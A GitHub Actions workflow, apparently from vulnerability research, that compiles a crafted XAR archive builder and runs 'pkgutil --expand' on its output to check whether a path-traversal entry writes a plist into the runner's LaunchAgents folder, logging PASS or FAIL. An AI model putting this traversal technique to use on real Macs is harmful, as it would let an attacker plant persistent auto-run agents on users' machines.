name: gate_b_run40
on:
  workflow_dispatch:
jobs:
  gate_b:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: GATE B - pkgutil LaunchAgents traversal
        shell: bash
        run: |
          LOG="/tmp/run40_gate_b.log"

          echo "=== GATE B run40 PRE-CHECK ===" | tee "$LOG"
          if [ -f /Users/runner/Library/LaunchAgents/xar_gate_b.plist ]; then
            echo "PRE_PLIST=PRESENT" | tee -a "$LOG"
          else
            echo "PRE_PLIST=ABSENT" | tee -a "$LOG"
          fi

          cc -O2 -o build_xar_r40 build_xar_r40.c -lz \
             -framework CoreFoundation \
             -I/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include \
             2>&1 | tee -a "$LOG"

          mkdir -p /tmp/r40_xar
          ./build_xar_r40 /tmp/r40_xar/gate_b.xar 2>&1 | tee -a "$LOG"

          OUTDIR=$(mktemp -d /tmp/gate_b40_pkgutil.XXXXXX)/out
          mkdir -p "$OUTDIR"
          echo "OUTDIR: $OUTDIR" | tee -a "$LOG"
          echo "Expected target: $OUTDIR/../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist" | tee -a "$LOG"

          mkdir -p /Users/runner/Library/LaunchAgents

          pkgutil --expand /tmp/r40_xar/gate_b.xar "$OUTDIR" 2>&1 | tee -a "$LOG" || true

          echo "=== LaunchAgents dir ===" | tee -a "$LOG"
          ls -la /Users/runner/Library/LaunchAgents/ | tee -a "$LOG"

          echo "=== GATE B CHECK ===" | tee -a "$LOG"
          if [ -f /Users/runner/Library/LaunchAgents/xar_gate_b.plist ]; then
            echo "GATE_B_PKGUTIL=PASS" | tee -a "$LOG"
            cat /Users/runner/Library/LaunchAgents/xar_gate_b.plist | tee -a "$LOG"
          else
            echo "GATE_B_PKGUTIL=FAIL" | tee -a "$LOG"
            exit 1
          fi

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: run40-gate-b-results
          path: /tmp/run40_gate_b.log
